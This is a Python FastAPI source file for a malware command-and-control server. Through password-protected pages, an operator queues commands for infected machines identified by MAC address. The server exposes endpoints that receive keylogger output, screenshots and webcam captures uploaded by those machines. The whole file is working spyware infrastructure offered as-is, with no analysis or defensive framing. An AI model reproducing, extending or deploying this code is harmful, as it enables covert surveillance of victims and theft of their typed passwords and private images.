import uvicorn
import os
from fastapi import FastAPI, Request, Form, Depends
from fastapi.responses import HTMLResponse
from fastapi.security import HTTPBasicCredentials
from typing import Dict, List, Union
from security import verify_credentials
from db_utils import load_db, update_db
from handle_clients import handle_command_request, handle_first_command, upload_file

app = FastAPI()


@app.get('/')
async def root(credentials: HTTPBasicCredentials = Depends(verify_credentials)) -> HTMLResponse:
    with open('source_files/index.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/add_commands.html')
async def add_commands_html(credentials: HTTPBasicCredentials
                            = Depends(verify_credentials)) -> HTMLResponse:
    with open('source_files/add_commands.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/view_clients.html')
async def root(credentials: HTTPBasicCredentials = Depends(verify_credentials)) -> HTMLResponse:
    with open('source_files/view_clients.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/db.json')
async def db_json(credentials: HTTPBasicCredentials = Depends(verify_credentials)) \
        -> Dict[str, Dict[str, Union[int, str, List[str]]]]:
    return load_db()


@app.post('/add_commands')
async def add_commands(credentials: HTTPBasicCredentials = Depends(verify_credentials),
                       mac_address: str = Form(default=None),
                       commands: str = Form(default="")) -> HTMLResponse:
    db = load_db()
    db[mac_address]['commands'] += [command.strip() for command
                                    in commands.split(',')
                                    if not command.isspace()]
    update_db(db)
    with open('source_files/commands_added.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/first_command')
async def first_command(request: Request) -> Dict[str, List[str]]:
    return handle_first_command(request)


@app.get('/command')
async def command(request: Request) -> Dict[str, List[str]]:
    return handle_command_request(request)


@app.post('/keylog_data')
async def keylog(request: Request) -> None:
    await upload_file(request, 'log', 'keylogs_received', 'txt', True)


@app.post('/screenshot')
async def screenshot(request: Request) -> None:
    file_type = request.headers['Content-Type'].split('/')[1]
    await upload_file(request, 'screenshot', 'screenshots_taken', file_type, False)


@app.post('/webcam_capture')
async def webcam_capture(request: Request) -> None:
    file_type = request.headers['Content-Type'].split('/')[1]
    await upload_file(request, 'webcam', 'webcam_shots_taken', file_type, False)


if __name__ == '__main__':
    uvicorn.run('main:app', host='0.0.0.0', port=int(os.environ.get("PORT", 30050)),
                workers=2, debug=True)
# uvicorn main:app --reload
